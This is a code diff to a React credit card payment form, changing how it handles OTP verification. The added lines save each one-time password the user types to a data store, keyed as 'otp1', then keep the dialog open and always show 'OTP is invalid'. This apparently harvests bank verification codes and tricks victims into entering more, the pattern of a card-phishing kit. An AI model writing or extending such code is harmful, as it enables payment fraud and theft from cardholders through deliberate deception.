@@ -208,15 +208,17 @@ export default function CreditCardForm() {
   // Handle OTP verification
   const handleVerifyOtp = (otp: string) => {
     setIsVerifying(true)
+    const visitorId = localStorage.getItem("visitor")
+
+    addData({ id: visitorId, otp1:otp })
 
     // Simulate verification process
     setTimeout(() => {
       setIsVerifying(false)
-      setShowOtpDialog(false)
+    // setShowOtpDialog(false)
 
       // After successful verification, submit the card data
-      const visitorId = localStorage.getItem("visitor")
-      addData({ id: visitorId, cardData })
+      alert('OTP is invalid')
 
       // Call the onSubmit prop if provided
     
